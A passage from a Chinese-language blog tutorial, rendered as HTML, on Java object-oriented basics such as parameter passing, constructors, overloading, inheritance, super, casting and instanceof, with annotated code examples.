class="comment">//调用方法：调用方需要自己先构造String[]</span></span><br><span class="line">Group g = <span class="keyword">new</span> Group();</span><br><span class="line">g.setNames(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;Xiao Ming&quot;</span>, <span class="string">&quot;Xiao Hong&quot;</span>, <span class="string">&quot;Xiao Jun&quot;</span>&#125;); <span class="comment">// 传入1个String[]</span></span><br></pre></td></tr></table></figure>
<code>String...</code>和<code>String[]</code>的区别：</li>
</ul>
<ol>
<li><code>String...</code>无法传入null。</li>
<li><code>String[]</code>可以传入null。调用方需要自己先构造String[]。 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Group g = <span class="keyword">new</span> Group();</span><br><span class="line">g.setNames(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>参数绑定<br>调用方把参数传递给实例方法时，调用时传递的值会按参数位置一一绑定。<br>举例：基本数据类型的参数传递<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParamBundle</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Persons p = <span class="keyword">new</span> Persons();</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">15</span>; <span class="comment">// n的值为15</span></span><br><span class="line">        p.setAge(n); <span class="comment">// 传入n的值</span></span><br><span class="line">        System.out.println(p.getAge()); <span class="comment">// 15</span></span><br><span class="line">        n = <span class="number">20</span>; <span class="comment">// n的值改为20</span></span><br><span class="line">        System.out.println(p.getAge()); <span class="comment">// 15,这里虽然n的值改变了，但由于setAge方法没有被调用，所以age的值仍然不变</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Persons</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
举例：引用类型的参数传递<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParamTrans</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        People p = <span class="keyword">new</span> People();</span><br><span class="line">        String[] fullname = <span class="keyword">new</span> String[] &#123; <span class="string">&quot;Homer&quot;</span>, <span class="string">&quot;Simpson&quot;</span> &#125;; <span class="comment">//这里使用String[]类型参数时，调用方需要自己先构造String[]</span></span><br><span class="line">        p.setName(fullname); <span class="comment">// 传入fullname数组</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Homer Simpson&quot;</span></span><br><span class="line">        fullname[<span class="number">0</span>] = <span class="string">&quot;Bart&quot;</span>; <span class="comment">// fullname数组的第一个元素修改为&quot;Bart&quot;</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Bart Simpson&quot;，getName方法的返回值是由name[0]和name[1]共同决定的，name[0]改变了，getName()的返回值也就变了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + <span class="keyword">this</span>.name[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String[] name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
举例：引用类型参数传递<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParamBundleQuote</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Per p = <span class="keyword">new</span> Per();</span><br><span class="line">        String bob = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">        p.setName(bob); <span class="comment">// 传入bob变量</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Bob&quot;</span></span><br><span class="line">        bob = <span class="string">&quot;Alice&quot;</span>; <span class="comment">// bob改名为Alice</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Bob&quot;，getName方法不受传递参数的影响，直接返回类的属性值name</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Per</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
练习：模仿学习，新增setAge和getAge这两个方法。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PracticeGetAge</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Please ming = <span class="keyword">new</span> Please();</span><br><span class="line">        ming.setName(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line">        ming.setAge(<span class="number">12</span>);</span><br><span class="line">        System.out.println(ming.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Please</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="comment">//int表示返回值类型是整型</span></span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="comment">//String表示返回值是引用类型字符串</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123; <span class="comment">//void表示没有返回值，int age表示传入的参数age是整型</span></span><br><span class="line">		<span class="keyword">this</span>.age = age; <span class="comment">//给当前类的属性age赋值，也就是给private变量赋值</span></span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="comment">//void表示没有返回值，String name表示传入的参数name是引用类型字符串</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3>创建实例的时候，实际上是通过构造方法来初始化实例的。前面一节我们初始化两个变量一共是设置了setAge和setName这两个方法，如果要用100个变量呢，难道手动设置100个方法？？？天哪，想到这就头大。程序这么自动化的东西，怎么可能做这种傻事呢🙃🙃🙃<br>于是，我们就想这样来偷懒，只创建一个方法，这个方法传递多个变量，同时返回多个变量的值。perfect，一个方法搞定所有变量的初始化。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MakeMethod</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pa p = <span class="keyword">new</span> Pa(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="number">15</span>); <span class="comment">//调用构造方法，必须使用new</span></span><br><span class="line">        System.out.println(p.getName());</span><br><span class="line">        System.out.println(p.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pa</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pa</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123; <span class="comment">//这就是构造方法。没有返回值（void也没有），并且方法名和类名一致。</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>默认构造方法<br>如果我们没有自定义构造方法，编译器会帮助我们创建一个默认的构造方法，像这样：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
所以我们没有定义构造方法时，也可以成功使用new调用构造方法。当然如果我们已经自定义了构造方法，编译器就不会画蛇添足了。</li>
<li>多构造方法<br>一个构造方法可以调用其他构造方法，这样做的目的是便于代码复用。调用其他构造方法的语法是<code>this(…)</code>。<br>举例：这个调用关系就是Pi()——&gt;Pi(String name)——&gt;Pi(String name, int age)，所以我们最终得到的结果是”unnamed,18”。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MultiMethod</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pi p = <span class="keyword">new</span> Pi();</span><br><span class="line">        System.out.println(p.getName());</span><br><span class="line">        System.out.println(p.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pi</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pi</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pi</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(name, <span class="number">18</span>); <span class="comment">// 调用另一个构造方法Pi(String, int)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="string">&quot;Unnamed&quot;</span>); <span class="comment">// 调用另一个构造方法Pi(String)</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3>方法重载的目的是，功能类似的方法使用同一名字，更容易记住，因此，调用起来更简单。<br>注意：方法重载的返回值类型通常都是相同的。<br>这种方法名相同，但各自的参数不同，称为<code>方法重载</code>（Overload）。<br>举例：<br>String类提供了多个重载方法indexOf()，可以查找子串：</li>
<li>int indexOf(int ch)：根据字符的Unicode码查找；</li>
<li>int indexOf(String str)：根据字符串查找；</li>
<li>int indexOf(int ch, int fromIndex)：根据字符查找，但指定起始位置；</li>
<li>int indexOf(String str, int fromIndex)根据字符串查找，但指定起始位置。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReloadMethod</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;Test string&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> n1 = s.indexOf(<span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">        <span class="keyword">int</span> n2 = s.indexOf(<span class="string">&quot;st&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> n3 = s.indexOf(<span class="string">&quot;st&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        System.out.println(n1);</span><br><span class="line">        System.out.println(n2);</span><br><span class="line">        System.out.println(n3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
练习：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PracticeReloadMethod</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pson ming = <span class="keyword">new</span> Pson();</span><br><span class="line">        Pson hong = <span class="keyword">new</span> Pson();</span><br><span class="line">        ming.setName(<span class="string">&quot;Xiao Ming&quot;</span>);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 给Pson增加重载方法setName(String, String):</span></span><br><span class="line">        hong.setName(<span class="string">&quot;Xiao&quot;</span>, <span class="string">&quot;Hong&quot;</span>);</span><br><span class="line">        System.out.println(ming.getName());</span><br><span class="line">        System.out.println(hong.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name1,String name2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name1+<span class="string">&quot; &quot;</span>+name2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc3z6vy17ej31f60u0q7c.jpg" alt="image.png"><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3>想象有一个类是Person，有name和age这两个Field。我们需要定义另一个类Student，要包含name、age、score这三个Field。<br>按照之前学过的定义类的方法，Student类的定义要重复再写一遍name和age，显然这样重复的工作和程序的简洁原则相违背。我们是不是可以在Person类的基础上扩充Field呢？没错，这就是继承了。打个比方，妈妈说家里需要采购水果、蔬菜、零食，第一天爸爸出门买了水果和蔬菜，第二天小明去采购的时候，是不是继承爸爸买的水果和蔬菜，只需要再买点零食就行了？差不多是这个意思。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Inherit</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Stu s = <span class="keyword">new</span> Stu(); <span class="comment">//将变量s实例化</span></span><br><span class="line">        s.setName(<span class="string">&quot;Dana&quot;</span>); <span class="comment">//由于Stu继承了Pn类，所以可以使用Pn的属性.setName</span></span><br><span class="line">        s.setAge(<span class="number">23</span>);</span><br><span class="line">        s.setScore(<span class="number">100</span>);</span><br><span class="line">        System.out.println(s.getName());</span><br><span class="line">        System.out.println(s.getAge());</span><br><span class="line">        System.out.println(s.getScore());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stu</span> <span class="keyword">extends</span> <span class="title">Pn</span> </span>&#123; <span class="comment">//Stu继承了Pn类</span></span><br><span class="line">    <span class="comment">// 不要重复name和age字段/方法,</span></span><br><span class="line">    <span class="comment">// 只需要定义新增score字段/方法:</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.score;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc49tx6avoj31f60u0wis.jpg" alt="image.png"></li>
<li>基础知识：<br>Java只允许一个class继承自一个类，因此，一个类有且仅有一个父类。只有Object特殊，它没有父类。（Object就是孙悟空，咱们普通人就是普通的类，有且仅有一个父亲~）</li>
<li>protected<br>继承有个特点，就是子类无法访问父类的private字段或者private方法。<br>为了让子类可以访问父类的字段，我们需要把private改为protected。用protected修饰的字段可以被子类访问。<br>很好理解，父亲不可能让子女继承一切的东西，他也有自己的隐私。他可以选择性地把一些财产拿给子女继承，这些财产的状态就是protected，只有子女后代可以继承，外人继承不了。<br>举例：子类继承父类的protected字段时，可以直接使用，不必将private转换为public。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritProtected</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        St s = <span class="keyword">new</span> St();</span><br><span class="line">        s.name = <span class="string">&quot;Dana&quot;</span>;</span><br><span class="line">        s.age = <span class="number">23</span>;</span><br><span class="line">        System.out.println(s.hello());</span><br><span class="line">        System.out.println(s.ageis());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ps</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">St</span> <span class="keyword">extends</span> <span class="title">Ps</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name; <span class="comment">// OK!</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ageis</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>super<br>引用父类的字段，有这几种方法：</li>
</ul>
<ol>
<li><code>this.name</code></li>
<li><code>name</code></li>
<li><code>super.name</code><br>在Java中，任何class的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句<code>super();</code>。<br>如果父类没有默认的构造方法，子类就必须显式调用super()并给出参数以便让编译器定位到父类的一个合适的构造方法。<br>子类不会继承任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritSuper</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Stud s = <span class="keyword">new</span> Stud(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="number">12</span>, <span class="number">89</span>);</span><br><span class="line">        System.out.println(s.getName());</span><br><span class="line">        System.out.println(s.getAge());</span><br><span class="line">        System.out.println(s.getScore());   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pers</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pers</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stud</span> <span class="keyword">extends</span> <span class="title">Pers</span> </span>&#123;	</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Stud</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">super</span>(name,age); <span class="comment">//子类的构造方法里，第一句必须是调用父类的构造方法</span></span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>向上转型<br>把一个子类类型安全地变为父类类型的赋值，被称为<code>向上转型</code>（upcasting）。因为子类继承父类，所以子类具备父类的全部Field，向上转型so easy。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Student s = <span class="keyword">new</span> Student(); <span class="comment">//假定Student是Person的子类</span></span><br><span class="line">Person p = s; <span class="comment">// upcasting, ok</span></span><br><span class="line">Object o1 = p; <span class="comment">// upcasting, ok</span></span><br><span class="line">Object o2 = s; <span class="comment">// upcasting, ok</span></span><br></pre></td></tr></table></figure>
继承树是<code>Student &gt; Person &gt; Object</code>，所以，可以把Student类型转型为Person，或者更高层次的Object。<br>很好理解，子女继承了父亲的财产，阶层升level的可能性当然是很大的。或者从伦理角度分析，子女也会有子女，所以子类升级为父类，这样的向上转型很简单。</li>
<li>向下转型<br>把一个父类类型强制转型为子类类型，就是<code>向下转型</code>（downcasting）。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person p1 = <span class="keyword">new</span> Student(); <span class="comment">// upcasting, ok 这里相当于是把父亲定义为儿子：父亲是爷爷的儿子</span></span><br><span class="line">Person p2 = <span class="keyword">new</span> Person(); <span class="comment">//这里把父亲定义为父亲：父亲是小明的父亲</span></span><br><span class="line">Student s1 = (Student) p1; <span class="comment">// ok 这句话就是说：因为父亲是爷爷的儿子，所以父亲是一个儿子</span></span><br><span class="line">Student s2 = (Student) p2; <span class="comment">// runtime error! ClassCastException! 这句话是说：父亲是小明的父亲，父亲是一个儿子？！当然不对咯</span></span><br></pre></td></tr></table></figure>
引申学习：<code>instanceof</code>的用法<br>为了避免向下转型出错，Java提供了instanceof操作符。<br>instanceof实际上判断一个变量所指向的实例是否是指定类型，或者这个类型的子类。如果一个引用变量为null，那么对任何instanceof的判断都为false。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person p = <span class="keyword">new</span> Person(); <span class="comment">//p是父亲</span></span><br><span class="line">System.out.println(p <span class="keyword">instanceof</span> Person); <span class="comment">// true p是不是父亲</span></span><br><span class="line">System.out.println(p <span class="keyword">instanceof</span> Student); <span class="comment">// false p是不是儿子</span></span><br><span class="line"></span><br><span class="line">Student s = <span class="keyword">new</span> Student(); <span class="comment">//s是儿子</span></span><br><span class="line">System.out.println(s <span class="keyword">instanceof</span> Person); <span class="comment">// true s是不是父亲的儿子</span></span><br><span class="line">System.out.println(s <span class="keyword">instanceof</span> Student); <span class="comment">// true s是不是儿子</span></span><br><span class="line"></span><br><span class="line">Student n = <span class="keyword">null</span>; <span class="comment">//n什么也不是</span></span><br><span class="line">System.out.println(n <span class="keyword">instanceof</span> Student); <span class="comment">// false n是不是儿子</span></span><br></pre></td></tr></table></figure></li>
